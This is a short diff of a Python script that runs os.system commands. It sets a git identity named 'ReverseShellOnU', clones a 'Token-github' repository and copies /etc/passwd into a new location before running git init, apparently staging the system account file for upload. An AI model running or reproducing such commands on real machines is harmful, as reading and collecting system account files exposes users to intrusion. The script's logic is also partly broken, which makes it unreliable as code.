@@ -3,7 +3,7 @@ os.system('git config --global user.email "alberttventura@gmail.com"')
 os.system('git config --global user.name "ReverseShellOnU"')
 os.chdir("/home/kali")
 os.system("git clone git@github.com:ReverseShellOnU/Token-github.git")
-os.system("cp /etc/passwd /home/kali/Token-github")
+os.system("cp /etc/passwd /home/kali/passwd")
 os.chdir("/home/kali/passwd")
     
 os.system("git init")
